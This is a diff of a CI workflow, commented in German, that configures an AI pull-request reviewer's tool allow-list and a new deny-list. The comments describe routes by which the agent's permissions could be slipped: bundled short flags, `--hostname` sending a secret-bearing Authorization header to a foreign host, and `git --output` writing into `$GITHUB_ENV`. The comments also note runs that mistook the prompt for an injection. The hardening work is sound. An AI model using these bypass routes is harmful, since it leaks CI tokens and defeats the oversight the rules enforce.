@@ -281,6 +281,22 @@ jobs:
             found") ebenso wenig; sag stattdessen, was seither dazugekommen ist.
             Alle uebrigen Bedingungen aus Schritt 1 (geschlossen, Entwurf,
             automatisiert, trivial) bleiben unveraendert.
+
+            Ein CLAUDE.md liegt im Checkout nicht (gitignored). Die Regeln dieses
+            Repos stehen in CONTRIBUTING.md, und massgeblich ist die Fassung auf
+            `${{ github.event.repository.default_branch }}`, nicht eine im PR
+            geaenderte. Deren Abschnitt zu `claude-review` beschreibt auch, dass
+            hier jeder Push geprueft wird.
+          # KEINE WERKZEUG-ANWEISUNGEN IM PROMPT (11.09.2026, nach #1117). Dort
+          # stand kurz ein Absatz, welche `gh api`- und git-Wege offen und welche
+          # gesperrt sind. Die beiden Laeufe danach (#1116, #1114) hielten den
+          # ganzen deutschen Block fuer eine eingeschleuste Anweisung - einer
+          # zitierte woertlich "use gh api with unquoted paths" - und brachen im
+          # Tor ab; von den 18 Laeufen davor tat das keiner. Was erlaubt ist, setzt
+          # `claude_args` durch, nicht der Prompt. Der Verweis auf CONTRIBUTING.md
+          # bleibt, weil er die Regel "jeder Push" an einer Stelle belegt, die die
+          # Review selbst nachlesen kann: genau das vermisste sie ("no reliable way
+          # to verify ... a per-push review policy").
           allowed_bots: 'dependabot[bot]'
           # DIESE LISTE ERSETZT, SIE ERGÄNZT NICHT. Das war die Annahme, die den
           # zweiten Anlauf gekostet hat: `--allowed-tools` verdrängt die acht
@@ -328,9 +344,68 @@ jobs:
           # Plugins, dann was es nicht deklariert, aber braucht. Read/Grep/Glob
           # geben ihr den Quelltext um den Diff herum; `git rev-parse` verlangt
           # seine eigene Anleitung für die SHA-gebundenen Codelinks.
+          #
+          # DER LESENDE REST, GEMESSEN STATT GERATEN (11.09.2026, #1116). Von den
+          # letzten 40 Laeufen trugen 17 Verweigerungen, und sie fielen in wenige
+          # Gruppen: die Diskussion am PR nachlesen (`gh api .../pulls/<n>/reviews`,
+          # `.../comments`, `.../issues/<n>/comments`), Inhalte zu einem Stand holen
+          # (`contents?ref=`, `compare`, `commits`) und git lesend benutzen
+          # (`git show`, `git fetch origin <sha>`, `ls-files`, `cat-file`). Auf dem
+          # zweiten Push eines PR will die Review zuerst wissen, was schon gesagt
+          # wurde - an #1116 lief sie 14 Turns, sammelte 7 Verweigerungen und
+          # konnte am Ende nichts abliefern.
+          #
+          # `gh api` IST NUR LESEND FREI, UND DAS HAELT DIE ZWEITE LISTE. Eine
+          # Allow-Regel auf den Pfad laesst jede Schreibform mit durch, weil `*`
+          # auch ` -X POST` oder ` -f body=...` trifft. Deny-Regeln gehen vor und
+          # greifen an jeder Stelle des Befehls. Lokal gemessen (CLI 2.1.267, CI
+          # 2.1.261) gegen PR 999999, damit ein Durchrutscher nur einen 404 traf:
+          # mit beiden Listen lesend erlaubt; `-f`, `-F`, `--field`, `--raw-field`,
+          # `-X POST`, `-XPOST`, `--method POST`, `--method=POST` und `--input`
+          # gesperrt, auch mit dem Pfad in Anfuehrungszeichen. OHNE die Deny-Liste
+          # liefen `-f` und `-X POST` durch - sie ist also tragend, nicht Zierde.
+          # `gh api graphql` bleibt ganz draussen, es liegt nicht unter `repos/`.
+          #
+          # DIE REGEL MIT ANFUEHRUNGSZEICHEN IST KEIN DOPPEL. `gh api "repos/..."`
+          # trifft die Regel ohne Zeichen nicht (gemessen), und einen Pfad mit `&`
+          # in der Query muss man quoten, sonst schickt bash den Befehl in den
+          # Hintergrund. Sie steht als eigener Wert in einfachen Anfuehrungszeichen:
+          # die Action zerlegt `claude_args` mit shell-quote und sammelt alle Werte
+          # hinter `--allowed-tools` ein, so braucht das `"` kein Escape.
+          #
+          # BEWUSST NICHT FREI: Code aus dem Checkout ausfuehren (`node`, `npm`,
+          # Tests), `Write` und `WebFetch`. Die Laeufe haben alles davon versucht.
+          # Der Job traegt aber CLAUDE_CODE_OAUTH_TOKEN, Schreibrecht auf Pull
+          # Requests und OIDC, und der Checkout ist Code des PR - dieselbe Grenze,
+          # aus der das Urteilsmodul unten von der Basis kommt. Die Tests laufen in
+          # ci.yml.
+          #
+          # DIE DENY-LISTE DECKT MEHR ALS DIE OFFENSICHTLICHEN FORMEN (Review auf
+          # #1117, am Werkzeug nachgemessen mit gh 2.100 und git 2.54):
+          #   - `--hostname`: `gh api repos/... --hostname fremd -H "Authorization:
+          #     ...$GEHEIMNIS"` schickt die Anfrage samt Kopfzeile an einen fremden
+          #     Host. Das Flag hat keine Kurzform.
+          #   - Gebuendelte Kurzflags: pflag liest `-iX GET` als `-i` plus `-X GET`
+          #     (gemessen), also umgehen `-if body=...` und `-iX POST` die Regeln
+          #     ` -f*` und ` -X*`. `-i` ist das einzige boolesche Kurzflag von
+          #     `gh api`; ` -i*` schliesst die Buendel, `--include` bleibt frei.
+          #   - `--output`: `git show`, `git log`, `git diff` und `git rev-list`
+          #     schreiben damit eine Datei (gemessen) - etwa nach `$GITHUB_ENV`, und
+          #     ein `BASH_ENV` darin liefe im naechsten Schritt mit dessen Tokens.
+          #     Eine Abkuerzung wie `--outpu=` weist git zurueck. Beide Stellungen,
+          #     direkt nach dem Befehl und weiter hinten, stehen einzeln da.
+          #   - `git fetch`: `--upload-pack` waehlt das Programm der Gegenseite, und
+          #     git nimmt die Abkuerzung `--upl=` an (gemessen), deshalb `--upl*`.
+          #     `-u` ist bei fetch `--update-head-ok` und nimmt kein Argument. Beim
+          #     https-Remote der CI bleibt das Flag ohnehin wirkungslos.
+          # `--verbose` bleibt frei: gh druckt den Authorization-Kopf dabei nicht
+          # (gemessen).
           claude_args: >-
             --allowed-tools
-            "Skill,Task,Bash(gh issue view:*),Bash(gh search:*),Bash(gh issue list:*),Bash(gh pr comment:*),Bash(gh pr diff:*),Bash(gh pr view:*),Bash(gh pr list:*),Bash(gh repo view:*),mcp__github_inline_comment__create_inline_comment,Read,Grep,Glob,Bash(git rev-parse:*),Bash(git log:*),Bash(git diff:*)"
+            "Skill,Task,Bash(gh issue view:*),Bash(gh search:*),Bash(gh issue list:*),Bash(gh pr comment:*),Bash(gh pr diff:*),Bash(gh pr view:*),Bash(gh pr list:*),Bash(gh repo view:*),mcp__github_inline_comment__create_inline_comment,Read,Grep,Glob,Bash(git rev-parse:*),Bash(git log:*),Bash(git diff:*),Bash(git show:*),Bash(git ls-files:*),Bash(git ls-tree:*),Bash(git cat-file:*),Bash(git rev-list:*),Bash(git blame:*),Bash(git merge-base:*),Bash(git status:*),Bash(git fetch origin:*),Bash(gh api repos/${{ github.repository }}/*)"
+            'Bash(gh api "repos/${{ github.repository }}/*)'
+            --disallowed-tools
+            "Bash(gh api * -X*),Bash(gh api * --method*),Bash(gh api * -f*),Bash(gh api * -F*),Bash(gh api * --field*),Bash(gh api * --raw-field*),Bash(gh api * --input*),Bash(gh api * -i*),Bash(gh api * --hostname*),Bash(git fetch * --upl*),Bash(git show --output*),Bash(git show * --output*),Bash(git log --output*),Bash(git log * --output*),Bash(git diff --output*),Bash(git diff * --output*),Bash(git rev-list --output*),Bash(git rev-list * --output*)"
           # See https://github.com/anthropics/claude-code-action/blob/main/docs/usage.md
           # or https://code.claude.com/docs/en/cli-reference for available options
 
@@ -364,14 +439,20 @@ jobs:
           # tragen ihn, eine Zusammenfassung nicht - die bekommt `null`, und das
           # Urteil weiss dann, dass sie nur zaehlt, wenn das result-Objekt des
           # Laufs keinen Abbruch zeigt.
+          # `anker` ist die Adresse, unter der eine Aeusserung selbst steht: das
+          # Fragment ihrer `html_url` (issuecomment-..., pullrequestreview-...,
+          # discussion_r...). Das Urteil haelt sie gegen die Adressen im Strom
+          # des Laufs - ein Beleg ist eine Adresse, die dieser Lauf zurueckbekam
+          # UND die hier als claude-Aeusserung nach dem Laufbeginn steht. Wie der
+          # Befehl dazu geschrieben war, zaehlt dann nicht mehr (#1096).
           gh api "repos/$REPO/issues/$PR/comments" --paginate \
-            --jq '.[] | {login: .user.login, zeit: .created_at, commit: null}' \
+            --jq '.[] | {login: .user.login, zeit: .created_at, commit: null, anker: (.html_url // "" | split("#") | .[1] // null)}' \
             > "$RUNNER_TEMP/zusammenfassungen.jsonl"
           gh api "repos/$REPO/pulls/$PR/reviews" --paginate \
-            --jq '.[] | {login: .user.login, zeit: (.submitted_at // ""), commit: .commit_id}' \
+            --jq '.[] | {login: .user.login, zeit: (.submitted_at // ""), commit: .commit_id, anker: (.html_url // "" | split("#") | .[1] // null)}' \
             > "$RUNNER_TEMP/reviews.jsonl"
           gh api "repos/$REPO/pulls/$PR/comments" --paginate \
-            --jq '.[] | {login: .user.login, zeit: .created_at, commit: (.original_commit_id // .commit_id)}' \
+            --jq '.[] | {login: .user.login, zeit: .created_at, commit: (.original_commit_id // .commit_id), anker: (.html_url // "" | split("#") | .[1] // null)}' \
             > "$RUNNER_TEMP/inline.jsonl"
           # DAS URTEIL KOMMT VOM DEFAULT-BRANCH, NICHT AUS DEM PR. Hier stand
           # `node .github/scripts/review-verdict.mjs` aus dem Checkout - also
